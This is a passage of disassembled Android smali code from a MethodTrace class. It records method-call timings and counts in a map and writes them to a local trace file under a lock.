    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    sget-object v21, Lcom/mycompany/myapp/MethodTrace;->filePath:Ljava/io/File;

    invoke-direct/range {v20 .. v21}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    move-object/from16 v13, v19

    .line 57
    new-instance v19, Ljava/io/BufferedWriter;

    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    move-object/from16 v21, v13

    invoke-direct/range {v20 .. v21}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    move-object/from16 v14, v19

    .line 60
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methods:Ljava/util/ArrayList;

    check-cast v19, Ljava/util/Collection;

    invoke-interface/range {v19 .. v19}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v19

    move-object/from16 v15, v19

    .line 62
    :goto_2
    move-object/from16 v19, v15

    invoke-interface/range {v19 .. v19}, Ljava/util/Iterator;->hasNext()Z

    move-result v19

    if-nez v19, :cond_5

    .line 66
    move-object/from16 v19, v14

    invoke-virtual/range {v19 .. v19}, Ljava/io/BufferedWriter;->flush()V

    .line 67
    move-object/from16 v19, v14

    invoke-virtual/range {v19 .. v19}, Ljava/io/BufferedWriter;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 78
    :goto_3
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->fileLock:Ljava/util/concurrent/locks/ReadWriteLock;

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/ReadWriteLock;->writeLock()Ljava/util/concurrent/locks/Lock;

    move-result-object v19

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/Lock;->unlock()V

    goto/16 :goto_0

    .line 42
    :cond_4
    const/16 v19, 0x2

    :try_start_2
    move/from16 v0, v19

    new-array v0, v0, [Ljava/lang/Long;

    move-object/from16 v19, v0

    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    const/16 v21, 0x0

    const-wide/16 v22, 0x0

    new-instance v24, Ljava/lang/Long;

    move-wide/from16 v30, v22

    move-object/from16 v32, v24

    move-object/from16 v22, v32

    move-wide/from16 v23, v30

    move-object/from16 v25, v32

    move-wide/from16 v30, v23

    move-object/from16 v32, v25

    move-object/from16 v23, v32

    move-wide/from16 v24, v30

    move-object/from16 v26, v32

    invoke-direct/range {v23 .. v25}, Ljava/lang/Long;-><init>(J)V

    aput-object v22, v20, v21

    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    const/16 v21, 0x1

    const-wide/16 v22, 0x0

    new-instance v24, Ljava/lang/Long;

    move-wide/from16 v30, v22

    move-object/from16 v32, v24

    move-object/from16 v22, v32

    move-wide/from16 v23, v30

    move-object/from16 v25, v32

    move-wide/from16 v30, v23

    move-object/from16 v32, v25

    move-object/from16 v23, v32

    move-wide/from16 v24, v30

    move-object/from16 v26, v32

    invoke-direct/range {v23 .. v25}, Ljava/lang/Long;-><init>(J)V

    aput-object v22, v20, v21
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto/16 :goto_1

    .line 73
    :catch_0
    move-exception v19

    move-object/from16 v8, v19

    .line 76
    move-object/from16 v19, v8

    :try_start_3
    invoke-virtual/range {v19 .. v19}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_3

    .line 60
    :cond_5
    move-object/from16 v19, v15

    :try_start_4
    invoke-interface/range {v19 .. v19}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v19

    check-cast v19, Ljava/lang/String;

    move-object/from16 v17, v19

    .line 61
    move-object/from16 v19, v14

    new-instance v20, Ljava/lang/StringBuffer;

    move-object/from16 v30, v20

    move-object/from16 v20, v30

    move-object/from16 v21, v30

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v21, Ljava/lang/StringBuffer;

    move-object/from16 v30, v21

    move-object/from16 v21, v30

    move-object/from16 v22, v30

    invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v22, Ljava/lang/StringBuffer;

    move-object/from16 v30, v22

    move-object/from16 v22, v30

    move-object/from16 v23, v30

    invoke-direct/range {v23 .. v23}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v23, Ljava/lang/StringBuffer;

    move-object/from16 v30, v23

    move-object/from16 v23, v30

    move-object/from16 v24, v30

    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v24, v17

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v23

    const-string v24, "::"

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v23

    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v22

    sget-object v23, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v24, v17

    invoke-virtual/range {v23 .. v24}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v23

    check-cast v23, [Ljava/lang/Long;

    const/16 v24, 0x0

    aget-object v23, v23, v24

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    const-string v22, "::"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    sget-object v21, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v22, v17

    invoke-virtual/range {v21 .. v22}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v21

    check-cast v21, [Ljava/lang/Long;

    const/16 v22, 0x1

    aget-object v21, v21, v22

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 62
    move-object/from16 v19, v14

    invoke-virtual/range {v19 .. v19}, Ljava/io/BufferedWriter;->newLine()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto/16 :goto_2

    .line 67
    :catch_1
    move-exception v19

    move-object/from16 v13, v19

    .line 69
    move-object/from16 v19, v13

    :try_start_5
    invoke-virtual/range {v19 .. v19}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_3

    .line 73
    :cond_6
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Long;

    move-object/from16 v21, v0

    move-object/from16 v30, v21

    move-object/from16 v21, v30

    move-object/from16 v22, v30

    const/16 v23, 0x0

    invoke-static {}, Ljava/lang/System;->nanoTime()J

    move-result-wide v24

    new-instance v26, Ljava/lang/Long;

    move-wide/from16 v30, v24

    move-object/from16 v32, v26

    move-object/from16 v24, v32

    move-wide/from16 v25, v30

    move-object/from16 v27, v32

    move-wide/from16 v30, v25

    move-object/from16 v32, v27

    move-object/from16 v25, v32

    move-wide/from16 v26, v30

    move-object/from16 v28, v32

    invoke-direct/range {v25 .. v27}, Ljava/lang/Long;-><init>(J)V

    aput-object v24, v22, v23

    move-object/from16 v30, v21

    move-object/from16 v21, v30

    move-object/from16 v22, v30

    const/16 v23, 0x1

    move-wide/from16 v24, v11

    const-wide/16 v26, 0x1

    add-long v24, v24, v26

    new-instance v26, Ljava/lang/Long;

    move-wide/from16 v30, v24

    move-object/from16 v32, v26

    move-object/from16 v24, v32

    move-wide/from16 v25, v30

    move-object/from16 v27, v32

    move-wide/from16 v30, v25

    move-object/from16 v32, v27

    move-object/from16 v25, v32

    move-wide/from16 v26, v30

    move-object/from16 v28, v32

    invoke-direct/range {v25 .. v27}, Ljava/lang/Long;-><init>(J)V

    aput-object v24, v22, v23

    invoke-virtual/range {v19 .. v21}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    move-result-object v19

    goto/16 :goto_3

    .line 76
    :catchall_0
    move-exception v19

    move-object/from16 v4, v19

    .line 78
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->fileLock:Ljava/util/concurrent/locks/ReadWriteLock;

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/ReadWriteLock;->writeLock()Ljava/util/concurrent/locks/Lock;

    move-result-object v19

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/Lock;->unlock()V

    move-object/from16 v19, v4

    throw v19
.end method
